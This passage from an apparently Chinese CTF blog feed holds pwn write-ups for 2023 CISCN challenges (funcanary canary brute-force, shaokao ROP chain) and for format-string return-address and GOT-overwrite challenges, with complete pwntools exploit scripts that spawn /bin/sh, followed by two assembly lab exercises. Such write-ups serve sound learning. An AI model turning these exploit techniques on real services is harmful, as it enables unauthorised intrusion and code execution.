class="string">b&#x27;c%10$hn&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *0x80485AF&#x27;)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Try again!\n&#x27;</span>)</span><br><span class="line">payload3=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>((stack_addr&amp;<span class="number">0xffff</span>)+<span class="number">0x4</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%6$hn&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *0x80485AF&#x27;)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.sendline(payload3)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Try again!\n&#x27;</span>)</span><br><span class="line">payload4=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>((printf_got+<span class="number">2</span>)&amp;<span class="number">0xffff</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%10$hn&#x27;</span></span><br><span class="line">p.sendline(payload4)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Try again!\n&#x27;</span>)</span><br><span class="line">payload5=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(sys_addr&amp;<span class="number">0xffff</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%7$hn&#x27;</span>+<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(((sys_addr&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>)-(sys_addr&amp;<span class="number">0xffff</span>)).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%11$hn&#x27;</span></span><br><span class="line">p.sendline(payload5)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Try again!\n&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *0x80485AF&#x27;)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> stack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023ciscn-funcanary</title>
      <link href="/posts/10017/"/>
      <url>/posts/10017/</url>
      
        <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-30%20103524.png"></p><p>checksec下,保护全开</p><p>主函数逻辑如下</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-30%20103652.png"></p><p>存在fork函数创建子进程</p><blockquote><p>v3 &#x3D; fork(); 是 C 编程语言中的一行代码，它调用 fork() 函数并将其返回值分配给名为 v3 的变量。 fork() 函数通过复制调用进程来创建一个新进程。 fork() 函数被调用后，新进程（称为子进程）将与原进程（称为父进程）相同，但它们将独立执行。</p><p>fork()函数的返回值用于判断这段代码是在父进程中执行还是在子进程中执行。 如果 fork() 返回 0，则代码正在子进程中执行。 如果 fork() 返回正值，则代码正在父进程中执行，返回值是子进程的进程 ID。 如果 fork() 返回 -1，则发生错误并且没有创建子进程。</p></blockquote><p>进入sub_128A()函数</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-30%20103729.png"></p><p>存在栈溢出漏洞且有canary，考虑到有fork函数，可以使用canary爆破</p><blockquote><p>对于 Canary，虽然每次进程重启后的 Canary 不同 (相比 GS，GS 重启后是相同的)，但是同一个进程中的不同线程的 Canary 是相同的， 并且 通过 fork 函数创建的子进程的 Canary 也是相同的，因为 fork 函数会直接拷贝父进程的内存。我们可以利用这样的特点，彻底逐个字节将 Canary 爆破出来。</p></blockquote><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-30%20103756.png"></p><p>存在后门函数</p><p>解题思路：</p><p>计算出canary距rbp的偏移，在ida里可以看到，即0x8，所以我们填充0x62个padding+canary+0x8个padding+后门函数的地址就可以完成调用。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">爆破Canary的通用模板</span><br><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;gnome-terminal&#x27;,&#x27;-x&#x27;,&#x27;bash&#x27;,&#x27;-c&#x27;]</span></span><br><span class="line"><span class="comment">#context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;)</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./funcanary&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">  p = process(<span class="string">&#x27;./funcanary&#x27;</span>)</span><br><span class="line"> <span class="comment">#libc = elf.libc</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">  p =remote()</span><br><span class="line">  libc = ELF()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;welcome\n&#x27;</span>)</span><br><span class="line">canary = <span class="string">&#x27;\x00&#x27;</span> //canary的最低位始终为<span class="string">&#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;the &quot;</span> + <span class="built_in">str</span>(k) + <span class="string">&quot;: &quot;</span> + <span class="built_in">chr</span>(i))</span><br><span class="line">        p.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">104</span> + canary + <span class="built_in">chr</span>(i))</span><br><span class="line">        a = p.recvuntil(<span class="string">&quot;welcome\n&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(a)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;have fun&quot;</span> <span class="keyword">in</span> a:</span><br><span class="line">                canary += <span class="built_in">chr</span>(i)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;canary: &quot;</span> + canary)</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./funcanary&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">  p = process(<span class="string">&#x27;./funcanary&#x27;</span>)</span><br><span class="line"> <span class="comment">#libc = elf.libc</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">  p =remote()</span><br><span class="line">  libc = ELF()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;welcome\n&#x27;</span>)</span><br><span class="line">canary = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;the &quot;</span> + <span class="built_in">str</span>(k) + <span class="string">&quot;: &quot;</span> + <span class="built_in">chr</span>(i))</span><br><span class="line">        p.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">104</span> + canary + <span class="built_in">chr</span>(i))</span><br><span class="line">        a = p.recvuntil(<span class="string">&quot;welcome\n&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(a)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;have fun&quot;</span> <span class="keyword">in</span> a:</span><br><span class="line">                canary += <span class="built_in">chr</span>(i)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;canary: &quot;</span> + canary)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span> * <span class="number">104</span> + canary + <span class="string">&#x27;A&#x27;</span> * <span class="number">8</span> + <span class="string">b&#x27;\x31\x12&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023ciscn-shaokao</title>
      <link href="/posts/59067/"/>
      <url>/posts/59067/</url>
      
        <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-27%20171853.png"></p><p>拿到程序，checksec下，pie没开，nx和canary开着</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-27%20192914.png"></p><p>运行程序，分别试试1，2，3，4，发现一开始余额为233，啤酒烤串会花钱，承包摊位钱不够</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-27%20193523.png"></p><p>把程序放进ida分析，发现承包摊位需要100000，但是钱不够，继续观察</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-27%20204514.png"></p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-27%20204556.png"></p><p>看见啤酒，串的钱的计算方式有缺陷，输入负数，余额会增加，倒贴是吧😊</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-27%20205601.png"></p><p>成百万富翁啦:P</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-27%20205804.png"></p><p>买下摊位后，出现了改名这一新选项，进ida看看</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-27%20210034.png"></p><p>看见了strcpy函数，将v5复制到name，没有对复制的字符进行限制，scanf也没有对输入的字符进行限制，同时v5只能容纳32个字节，存在栈溢出漏洞</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-27%20211041.png"></p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-27%20211211.png"></p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-27%20211319.png"></p><p>计算出偏移为40</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-27%20221610.png"></p><p>因为程序函数很多，我们可以通过ROPgadget查找执行execve(“&#x2F;bin&#x2F;sh”,NULL,NULL)的片段</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-28%20171006.png"></p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-28%20171128.png"></p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-28%20171834.png"></p><p>在程序里找不到&#x2F;bin&#x2F;sh字符串,但是我们看到烧烤摊能改名，想到将&#x2F;bin&#x2F;sh字符串写进name空间。</p><p>完成前置工作，依据rop的基本思想，构造payload：</p><blockquote><p>from pwn import *<br>context(log_level&#x3D;’debug’)<br>p&#x3D;process(“.&#x2F;shaokao”)<br>#p&#x3D;remote(“123.56.251.120”,41843)<br>pop_rax_ret&#x3D;0x458827<br>pop_rdi_ret&#x3D;0x40264f<br>pop_rsi_ret&#x3D;0x40a67e<br>pop_rdx_rbx_ret&#x3D;0x4a404b<br>sys_call&#x3D;0x402404<br>bin_sh&#x3D;0x4E60F0<br>p.recv()<br>p.sendline(str(1).encode(‘utf-8’))<br>p.recv()<br>p.sendline(str(1).encode(‘utf-8’))<br>p.recv()<br>p.sendline(str(-100000).encode(‘utf-8’))<br>p.recv()<br>p.sendline(str(4).encode(‘utf-8’))<br>p.recv()<br>p.sendline(str(5).encode(‘utf-8’))<br>p.recv()</p><p>payload&#x3D;b’&#x2F;bin&#x2F;sh\x00’+b’A’*32<br>payload+&#x3D;p64(pop_rax_ret)+p64(0x3b)+p64(pop_rdi_ret)+p64(bin_sh)+p64(pop_rsi_ret)+p64(0)+p64(pop_rdx_rbx_ret)+p64(0)+p64(0)+p64(sys_call)<br>p.sendline(payload)<br>p.interactive()</p></blockquote><p> 注意&#x2F;bin&#x2F;sh字符串后要用\x00截断，致使程序能执行execve(“&#x2F;bin&#x2F;sh”,NULL,NULL)而不是execve(“&#x2F;bin&#x2F;shaaaaaaaa…”,NULL,NULL)</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>格式化字符串:修改返回地址</title>
      <link href="/posts/14994/"/>
      <url>/posts/14994/</url>
      
        <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-25%20214320.png" alt="屏幕截图 2023-05-25 214320"></p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-25%20214350.png" alt="屏幕截图 2023-05-25 214350"></p><p>IDA进程序看下，发现printf(s)存在格式化字符串漏洞，且第一次fgets输入字符1会执行close_borders，其实执行no_panic也同理，方便起见只演示下close_borders</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-25%20215106.png" alt="屏幕截图 2023-05-25 215106"></p><p>checksec下,relro保护全开，got表地址改不了，pie也打开了，地址是随机的。</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-25%20215525.png" alt="屏幕截图 2023-05-25 215525"></p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-25%20215559.png" alt="屏幕截图 2023-05-25 215559"></p><p>在ida里仔细找找，发现题目给了win()函数，但pie是打开的，ida里显示的是偏移地址</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-25%20220602.png" alt="屏幕截图 2023-05-25 220602"></p><p>gdb调试下，输入的值是格式化字符串的第6个参数</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-25%20220814.png" alt="屏幕截图 2023-05-25 220814"></p><p>rbp是第14个参数，返回地址是第15个参数，rbp的值与栈上储存返回地址的地址偏移为0x8</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-25%20221639.png" alt="屏幕截图 2023-05-25 221639"></p><p>得到基址0x555555554000</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-25%20221657.png" alt="屏幕截图 2023-05-25 221657"></p><p>基址+偏移，得到win函数的真实地址，计算其与返回地址的偏移（偏移是固定的），即0x55555555484-0x555555555165&#x3D;0x31f</p><p>确定下思路，先用第1个printf泄露出rbp,返回地址的值，rbp的值-0x8得到储存返回地址的真实地址，返回地址的值-0x31f得到win函数的真实地址。再通过第2个printf将储存返回地址的真实地址写入，修改为win函数的地址即可。注意，第二次写入储存返回地址的真实地址时，存在\x00截断(因为64位的地址最多使用12位)，要将返回地址放到payload末尾。最后接收flag之后一定要进交互，否则程序不会在终端（即屏幕）上显示接收到的字符。</p><p>exp如下：</p><blockquote><p>from pwn import *</p><p>context(log_level&#x3D;’debug’)</p><p>p&#x3D;process(‘.&#x2F;coronacation’)</p><p>p.recv()</p><p>offset&#x3D;0x8</p><p>win_offset&#x3D;0x31f</p><p>payload1&#x3D;str(1).encode(‘utf-8’)+b’%14$p.’+b’%15$p.’</p><p>p.sendline(payload1)</p><p>p.recvuntil(b’chose: 1’)</p><p>rbp&#x3D;int(p.recvuntil(b’.’,drop&#x3D;True),16)</p><p>ret&#x3D;int(p.recvuntil(b’.’,drop&#x3D;True),16)</p><p>print(hex(rbp))</p><p>print(hex(ret))</p><p>stack_ret&#x3D;rbp-offset</p><p>win_addr&#x3D;ret-win_offset</p><p>print(hex(stack_ret))</p><p>p.recv()</p><p>payload2&#x3D;b’%’+str((win_addr&amp;0xffff)).encode(‘utf-8’)+b’c’+b’%8$hn’</p><p>payload2&#x3D;payload2.ljust(16,b’a’)</p><p>payload2+&#x3D;p64(stack_ret)</p><p>p.sendline(payload2)</p><p>p.recvuntil(b’}’)</p><p>p.interactive()</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> stack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>格式化字符串:更改got表</title>
      <link href="/posts/58637/"/>
      <url>/posts/58637/</url>
      
        <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-21%20201417.png"></p><p>前两行memset将s,format中的值全部置为0,sprintf函数将s中的值与Repeater:拼接为一个字符串后存放在format中。printf(format)存在格式化字符串漏洞。</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-21%20202356.png"></p><p>checksec下,relro保护半开,可以更改got表。</p><blockquote><p>当RELRO保护为NO RELRO的时候，init.array、fini.array、got.plt均可读可写；为PARTIAL RELRO的时候，ini.array、fini.array可读不可写，got.plt可读可写；为FULL RELRO时，init.array、fini.array、got.plt均可读不可写。</p></blockquote><p>gdb下，确定格式化字符串的位置</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-21%20204247.png"></p><p>发现有两个地方存放着aaaaaaaa，这是为什么呢？看一眼ida，输入的字符串先存放在s中，然后与Repeater:拼接存入format。为了方便起见，我们选用上面的作为参数。计算下偏移</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-21%20205513.png"></p><p>确定下思路，更改strlen的got表地址为system的地址，下一次循环再发送&#x2F;bin&#x2F;sh完成调用。</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-21%20211908.png"></p><p>首先需要泄露出system的真实地址,我们在栈上找出了（__libc_start_main+245）的偏移，通过%151$s泄露出（libc_start_main+245）的真实地址再减去245得到libc_start_main的真实地址，继而得到基址，最终获得system的真实地址，即：</p><blockquote><p>libc_addr&#x3D;int(p.recv(8),16)-245</p><p>libc&#x3D;ELF(‘&#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc.so.6’)<br>libcbase&#x3D;libc_addr-libc.symbols[‘__libc_start_main’]</p><p>sys_addr&#x3D;libcbase+libc.symbols[‘system’]</p></blockquote><p>修改got表时需要注意使用hn而不是n，一次修改4个字节的话程序会崩溃，首先(sys_addr&amp;0xffff)-9取出system函数的低八位，-9是因为printf(format)输出了Repeater:这9个字符。然后((sys_addr&gt;&gt;16)&amp;0xffff)-(sys_addr&amp;0xffff)取出高两位的字节</p><p>exp如下：</p><blockquote><p>from pwn import *<br>p&#x3D;process(‘.&#x2F;axbfmt’)<br>elf&#x3D;ELF(‘.&#x2F;axbfmt’)<br>libc&#x3D;ELF(‘&#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc.so.6’)<br>p.recv()<br>payload1&#x3D;b’%151$p’<br>p.sendline(payload1)<br>p.recvuntil(b’0x’)<br>libc_addr&#x3D;int(p.recv(8),16)-245<br>libcbase&#x3D;libc_addr-libc.symbols[‘__libc_start_main’]<br>print(hex(libcbase))<br>sys_addr&#x3D;libcbase+libc.symbols[‘system’]<br>print(hex(sys_addr))<br>payload&#x3D;b’%’+str((sys_addr&amp;0xffff)-9).encode(‘utf-8’) +b’c%20$hn’<br>payload+&#x3D;b’%’+str(((sys_addr&gt;&gt;16)&amp;0xffff)-(sys_addr&amp;0xffff)).encode(‘utf-8’)+b’c%21$hn’<br>payload &#x3D; payload.ljust(0x31,b’a’)<br>payload+&#x3D;p32(elf.got[‘strlen’])+p32(elf.got[‘strlen’]+2)<br>p.sendlineafter(b”Please tell me:”,payload)<br>p.recv()<br>p.sendline(b’;&#x2F;bin&#x2F;sh\x00’)<br>print(hex((sys_addr&amp;0xffff)-9))<br>print(hex((sys_addr&gt;&gt;16)&amp;0xffff))</p><p>p.interactive()</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> stack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实验6:将data段中每一个单词的前4个字母改为大写字母</title>
      <link href="/posts/43171/"/>
      <url>/posts/43171/</url>
      
        <content type="html"><![CDATA[<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:code,<span class="built_in">ss</span>:stack,<span class="built_in">ds</span>:data</span><br><span class="line">stack <span class="meta">segment</span></span><br><span class="line"><span class="built_in">dw</span> <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span></span><br><span class="line">stack ends</span><br><span class="line">data <span class="meta">segment</span></span><br><span class="line"><span class="built_in">db</span> <span class="string">&#x27;1. display      &#x27;</span></span><br><span class="line"><span class="built_in">db</span> <span class="string">&#x27;2. brows        &#x27;</span></span><br><span class="line"><span class="built_in">db</span> <span class="string">&#x27;3. replace      &#x27;</span></span><br><span class="line"><span class="built_in">db</span> <span class="string">&#x27;4. modify       &#x27;</span></span><br><span class="line">data ends</span><br><span class="line">code <span class="meta">segment</span></span><br><span class="line"><span class="symbol">start:</span> <span class="keyword">mov</span> <span class="built_in">ax</span>,stack</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ss</span>,<span class="built_in">ax</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">sp</span>,<span class="number">16</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>,data</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ds</span>,<span class="built_in">ax</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">bx</span>,<span class="number">0</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>,<span class="number">4</span></span><br><span class="line"><span class="symbol">s0:</span> <span class="keyword">push</span> <span class="built_in">cx</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">si</span>,<span class="number">0</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>,<span class="number">4</span></span><br><span class="line"><span class="symbol">s:</span> <span class="keyword">mov</span> <span class="built_in">al</span>,[<span class="built_in">bx</span>+<span class="number">3</span>+<span class="built_in">si</span>]</span><br><span class="line"><span class="keyword">and</span> <span class="built_in">al</span>,<span class="number">11011111b</span></span><br><span class="line"><span class="keyword">mov</span> [<span class="built_in">bx</span>+<span class="number">3</span>+<span class="built_in">si</span>],<span class="built_in">al</span></span><br><span class="line"><span class="keyword">inc</span> <span class="built_in">si</span></span><br><span class="line"><span class="keyword">loop</span> s</span><br><span class="line"><span class="keyword">add</span> <span class="built_in">bx</span>,<span class="number">16</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">cx</span></span><br><span class="line"><span class="keyword">loop</span> s0</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>,<span class="number">4c00h</span></span><br><span class="line"><span class="keyword">int</span> <span class="number">21h</span></span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> assembly </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实验4:[bx]和loop的使用</title>
      <link href="/posts/29968/"/>
      <url>/posts/29968/</url>
      
        <content type="html"><![CDATA[<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">编程,向内存 <span class="number">0</span>:<span class="number">200</span>至<span class="number">0</span>:23f 依次传送数据 <span class="number">0</span>至<span class="number">63</span>(<span class="number">3fh</span>)</span><br><span class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:code</span><br><span class="line">code <span class="meta">segment</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>,<span class="number">20</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ds</span>,<span class="built_in">ax</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">bx</span>,<span class="number">0</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>,<span class="number">64</span></span><br><span class="line"><span class="symbol">s:</span> <span class="keyword">mov</span> <span class="built_in">ds</span>:[<span class="built_in">bx</span>],<span class="built_in">bl</span></span><br><span class="line"><span class="keyword">inc</span> <span class="built_in">bx</span></span><br><span class="line"><span class="keyword">loop</span> s</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>,<span class="number">4c00h</span></span><br><span class="line"><span class="keyword">int</span> <span class="number">21h</span></span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> assembly </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>程序基础概念</title>
      <link href="/posts/18301/"/>
      <url>/posts/18301/</url>
      
